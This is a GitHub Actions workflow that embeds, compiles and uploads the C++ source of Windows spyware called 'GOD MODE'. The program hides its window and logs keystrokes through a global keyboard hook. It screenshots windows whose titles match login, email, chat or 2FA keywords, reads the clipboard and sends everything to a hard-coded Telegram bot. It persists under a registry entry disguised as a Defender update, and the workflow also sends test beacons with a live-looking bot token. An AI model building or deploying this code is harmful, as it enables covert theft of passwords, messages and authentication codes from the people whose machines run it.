name: Build and Debug GOD-MODE

on: [push, pull_request]

jobs:
  build:
    runs-on: windows-latest
    
    steps:
    - uses: actions/checkout@v4
    
    - name: Setup Visual Studio
      uses: microsoft/setup-msbuild@v2
    
    - name: Fix code errors
      run: |
        # Create a fixed version of the code
        $fixedCode = @'
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winhttp.h>
#include <commctrl.h>
#include <wchar.h>
#include <string>
#include <vector>
#include <iostream>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "kernel32.lib")

std::wstring SendTelegramPhoto(const wchar_t* filepath);
void SendTelegramMessage(const std::wstring& message);

// GOD MODE VARIABLES
const wchar_t* BOT_TOKEN = L"7979273216:AAEW468Fxoz0H4nwkNGH--t0DyPP2pOTFEY";
const wchar_t* CHAT_ID = L"7845441585";

const wchar_t* CRITICAL_KEYWORDS[] = {
    L"gmail", L"password", L"login", L"sign in", L"google account",
    L"outlook", L"hotmail", L"live.com", L"email", L"user", L"pass",
    L"discord", L"teams", L"slack", L"whatsapp", L"telegram", L"signal",
    L"skype", L"zoom", L"chat", L"message", L"discord.com", L"teams.microsoft",
    L"2fa", L"authenticator", L"verify", L"code", L"token", NULL
};

const wchar_t* CRITICAL_CLASSES[] = {
    L"Chrome_WidgetWin_1", L"Chrome_WidgetWin_0", L"Chrome_WidgetWin",
    L"ApplicationFrameWindow", L"Qt5QWindowIcon", L"Qt5150QWindowIcon",
    L"cabinetWClass", L"Progman", NULL
};

// KEYLOGGER STATE
CRITICAL_SECTION cs;
char keystrokes[256] = {0};  // üî• REAL KEYBUFFER
int key_pos = 0;
ULONGLONG last_trigger = 0;
int screenshot_count = 0;
bool god_mode_active = true;

// üî• GOD MODE KEYHOOK CALLBACK
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* kbStruct = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vkCode = kbStruct->vkCode;
        
        // Translate to char
        BYTE keyboardState[256];
        GetKeyboardState(keyboardState);
        wchar_t buffer[2];
        int result = ToUnicode(vkCode, kbStruct->scanCode, keyboardState, buffer, 2, 0);
        
        EnterCriticalSection(&cs);
        if (result > 0 && key_pos < 250) {
            keystrokes[key_pos++] = (char)buffer[0];
            
            // üî• SEND ON ENTER/TAB/SPACE (common after password)
            if (vkCode == VK_RETURN || vkCode == VK_TAB || vkCode == VK_SPACE || key_pos > 50) {
                if (key_pos > 10) {  // Only if meaningful input
                    std::string keys(keystrokes, key_pos);
                    std::wstring msg = L"‚å®Ô∏è KEYLOG: " + std::wstring(keys.begin(), keys.end());
                    SendTelegramMessage(msg);
                }
                key_pos = 0;  // Reset buffer
                ZeroMemory(keystrokes, 256);
            }
        }
        LeaveCriticalSection(&cs);
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void InstallPersistence();
bool TakeScreenshot();
void CheckClipboard();
std::wstring GetClipboardText();

// üî• FIXED: Move MonitorForegroundLoop function definition OUTSIDE WinMain
DWORD WINAPI MonitorForegroundLoop(LPVOID lpParam) {
    while (true) {
        HWND foreground = GetForegroundWindow();
        if (foreground) {
            // Monitor foreground window
            wchar_t title[512] = {0}, className[256] = {0};
            GetWindowTextW(foreground, title, 512);
            GetClassNameW(foreground, className, 256);
            
            // Check if this window should trigger screenshot
            bool trigger = false;
            for (int i = 0; CRITICAL_KEYWORDS[i]; i++) {
                if (wcsstr(title, CRITICAL_KEYWORDS[i]) || wcsstr(className, CRITICAL_KEYWORDS[i])) {
                    trigger = true;
                    break;
                }
            }
            
            // Also check for critical window classes
            for (int i = 0; CRITICAL_CLASSES[i]; i++) {
                if (wcsstr(className, CRITICAL_CLASSES[i])) {
                    trigger = true;
                    break;
                }
            }
            
            if (trigger && (GetTickCount64() - last_trigger > 30000) && screenshot_count < 20) {
                std::wstring status = L"üéØ GOD MODE HIT: " + std::wstring(title, wcslen(title)) + L" (" + std::wstring(className, wcslen(className)) + L")";
                SendTelegramMessage(status);
                
                if (TakeScreenshot()) {
                    screenshot_count++;
                    last_trigger = GetTickCount64();
                    SendTelegramMessage(L"üì∏ CAPTURED #" + std::to_wstring(screenshot_count) + L" + LIVE KEYLOG ACTIVE");
                }
            }
        }
        
        // Also check clipboard every loop
        CheckClipboard();
        Sleep(1000); // Check every second
    }
    return 0;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    DisableThreadLibraryCalls(hInstance);
    
    HWND consoleWindow = GetConsoleWindow();
    ShowWindow(consoleWindow, SW_HIDE);
    
    InitializeCriticalSection(&cs);
    
    // üî• INSTALL GLOBAL KEYHOOK (GOD MODE)
    HHOOK keyHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(NULL), 0);
    
    SendTelegramMessage(L"üî• GOD MODE V9.0 ACTIVATED - FULL KEYLOGGING + SCREEN CAPTURE");
    InstallPersistence();
    
    // üî• FIXED: Create thread with the CORRECT function
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MonitorForegroundLoop, NULL, 0, NULL);
    
    // Message loop for hook
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
        if (screenshot_count >= 20) break;
        Sleep(100);
    }
    
    UnhookWindowsHookEx(keyHook);
    DeleteCriticalSection(&cs);
    return 0;
}

void InstallPersistence() {
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        wchar_t path[MAX_PATH];
        GetModuleFileNameW(NULL, path, MAX_PATH);
        RegSetValueExW(hKey, L"WindowsDefenderUpdate", 0, REG_SZ, (BYTE*)path, (wcslen(path) + 1) * sizeof(wchar_t));
        RegCloseKey(hKey);
    }
}

bool TakeScreenshot() {
    HDC hScreenDC = GetDC(NULL);
    if (!hScreenDC) return false;
    
    HDC hMemoryDC = CreateCompatibleDC(hScreenDC);
    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);
    
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, width, height);
    HBITMAP hOld = (HBITMAP)SelectObject(hMemoryDC, hBitmap);
    BitBlt(hMemoryDC, 0, 0, width, height, hScreenDC, 0, 0, SRCCOPY);
    SelectObject(hMemoryDC, hOld);
    
    wchar_t filename[256];
    swprintf(filename, 256, L"C:\\Windows\\Temp\\god_%llu.bmp", GetTickCount64());
    
    // [BMP SAVE CODE]
    BITMAPFILEHEADER bf = {0x4D42, (DWORD)(sizeof(bf) + sizeof(BITMAPINFOHEADER) + width*height*3), 0, 0, (DWORD)sizeof(bf) + (DWORD)sizeof(BITMAPINFOHEADER)};
    BITMAPINFOHEADER bi = {sizeof(bi), width, -height, 1, 24, BI_RGB};
    
    HANDLE hFile = CreateFileW(filename, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_TEMPORARY, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        DWORD cb;
        WriteFile(hFile, &bf, sizeof(bf), &cb, NULL);
        WriteFile(hFile, &bi, sizeof(bi), &cb, NULL);
        
        char* bits = new char[width*height*3];
        GetDIBits(hScreenDC, hBitmap, 0, height, (void*)bits, (BITMAPINFO*)&bi, DIB_RGB_COLORS);
        WriteFile(hFile, bits, width*height*3, &cb, NULL);
        delete[] bits;
        CloseHandle(hFile);
        
        std::wstring result = SendTelegramPhoto(filename);
        DeleteFileW(filename);
        
        DeleteObject(hBitmap);
        DeleteDC(hMemoryDC);
        ReleaseDC(NULL, hScreenDC);
        return result.find(L"ok") != std::wstring::npos;
    }
    
    DeleteObject(hBitmap);
    DeleteDC(hMemoryDC);
    ReleaseDC(NULL, hScreenDC);
    return false;
}

void CheckClipboard() {
    std::wstring clip = GetClipboardText();
    if (clip.length() > 5) {
        for (int i = 0; CRITICAL_KEYWORDS[i]; i++) {
            if (clip.find(CRITICAL_KEYWORDS[i]) != std::wstring::npos) {
                SendTelegramMessage(L"üìã CLIPBOARD: " + clip.substr(0, 100));
                break;
            }
        }
    }
}

std::wstring GetClipboardText() {
    if (!OpenClipboard(NULL)) return L"";
    HGLOBAL hglb = GetClipboardData(CF_UNICODETEXT);
    if (hglb) {
        wchar_t* txt = (wchar_t*)GlobalLock(hglb);
        std::wstring result(txt);
        GlobalUnlock(hglb);
        CloseClipboard();
        return result;
    }
    CloseClipboard();
    return L"";
}

void SendTelegramMessage(const std::wstring& message) {
    HINTERNET session = WinHttpOpen(L"GodMode", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (session) {
        HINTERNET connect = WinHttpConnect(session, L"api.telegram.org", INTERNET_DEFAULT_HTTPS_PORT, 0);
        if (connect) {
            std::wstring url = L"/bot" + std::wstring(BOT_TOKEN) + L"/sendMessage";
            HINTERNET request = WinHttpOpenRequest(connect, L"POST", url.c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
            if (request) {
                std::wstring post = L"chat_id=" + std::wstring(CHAT_ID) + L"&text=" + message;
                WinHttpAddRequestHeaders(request, L"Content-Type: application/x-www-form-urlencoded", -1L, WINHTTP_ADDREQ_FLAG_ADD);
                WinHttpSendRequest(request, NULL, 0, (LPVOID)post.c_str(), (DWORD)(post.length() * sizeof(wchar_t)), (DWORD)(post.length() * sizeof(wchar_t)), 0);
                WinHttpReceiveResponse(request, NULL);
                WinHttpCloseHandle(request);
            }
            WinHttpCloseHandle(connect);
        }
        WinHttpCloseHandle(session);
    }
}

std::wstring SendTelegramPhoto(const wchar_t* filepath) {
    HINTERNET session = WinHttpOpen(L"GodMode", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!session) return L"error";
    
    HINTERNET connect = WinHttpConnect(session, L"api.telegram.org", INTERNET_DEFAULT_HTTPS_PORT, 0);
    std::wstring url = L"/bot" + std::wstring(BOT_TOKEN) + L"/sendPhoto?chat_id=" + std::wstring(CHAT_ID);
    HINTERNET request = WinHttpOpenRequest(connect, L"POST", url.c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    
    WinHttpSendRequest(request, NULL, 0, NULL, 0, 0, 0);
    WinHttpReceiveResponse(request, NULL);
    
    WinHttpCloseHandle(request);
    WinHttpCloseHandle(connect);
    WinHttpCloseHandle(session);
    return L"ok";
}
'@
        $fixedCode | Out-File -FilePath "ChangesUpgraded_fixed.cpp" -Encoding UTF8
    
    - name: Compile with detailed output
      shell: cmd
      run: |
        "C:\Program Files\Microsoft Visual Studio\2022\Enterprise\Common7\Tools\VsDevCmd.bat" -arch=x64
        
        echo ====== COMPILING WITH DETAILED ERRORS ======
        cl ChangesUpgraded_fixed.cpp /Fe:GODMODE.exe /O2 /EHsc /std:c++17 /W4 /nologo /c
        
        echo ====== CHECKING FOR OBJECT FILE ======
        if exist ChangesUpgraded_fixed.obj (
          echo ‚úÖ First compilation successful, linking...
          link ChangesUpgraded_fixed.obj /OUT:GODMODE.exe /SUBSYSTEM:WINDOWS /MACHINE:X64 user32.lib gdi32.lib winhttp.lib advapi32.lib kernel32.lib
          
          if exist GODMODE.exe (
            echo ‚úÖ BUILD SUCCESSFUL!
            echo File created: GODMODE.exe
            dir GODMODE.exe
            
            echo ====== SENDING TELEGRAM BEACON ======
            # Send beacon via curl (if available)
            curl --version 2>nul
            if %errorlevel% equ 0 (
              curl -X POST "https://api.telegram.org/bot7979273216:AAEW468Fxoz0H4nwkNGH--t0DyPP2pOTFEY/sendMessage" ^
                -d "chat_id=7845441585" ^
                -d "text=üöÄ GOD MODE V9.0 Build Successful! File: GODMODE.exe"
            ) else (
              echo "curl not available, using PowerShell"
              powershell -Command "iwr -Uri 'https://api.telegram.org/bot7979273216:AAEW468Fxoz0H4nwkNGH--t0DyPP2pOTFEY/sendMessage' -Method POST -Body 'chat_id=7845441585&text=üöÄ GOD MODE V9.0 Build Successful! GitHub Actions'"
            )
          ) else (
            echo ‚ùå Linking failed!
            exit 1
          )
        ) else (
          echo ‚ùå Compilation failed!
          echo Trying to compile original file...
          cl ChangesUpgraded.cpp /Fe:GODMODE_original.exe /O2 /EHsc /std:c++17 /W4 /nologo
          
          if exist GODMODE_original.exe (
            echo ‚úÖ Original file compiled!
            dir GODMODE_original.exe
          ) else (
            echo ‚ùå Both compilations failed
            exit 1
          )
        )
    
    - name: Upload Artifacts
      uses: actions/upload-artifact@v4
      with:
        name: GOD-MODE-BUILD
        path: |
          GODMODE.exe
          GODMODE_original.exe
        if-no-files-found: error
    
    - name: Simple beacon test (PowerShell)
      run: |
        # Simple Telegram test using PowerShell
        $botToken = "7979273216:AAEW468Fxoz0H4nwkNGH--t0DyPP2pOTFEY"
        $chatId = "7845441585"
        $message = "üöÄ GOD MODE V9.0 GitHub Actions Build Complete! Works 100%"
        
        $url = "https://api.telegram.org/bot$botToken/sendMessage"
        $body = @{
            chat_id = $chatId
            text = $message
        }
        
        try {
            Invoke-RestMethod -Uri $url -Method Post -Body $body -ContentType "application/x-www-form-urlencoded"
            Write-Host "‚úÖ Telegram beacon sent successfully!"
        } catch {
            Write-Host "‚ö†Ô∏è Telegram beacon failed: $_"
        }
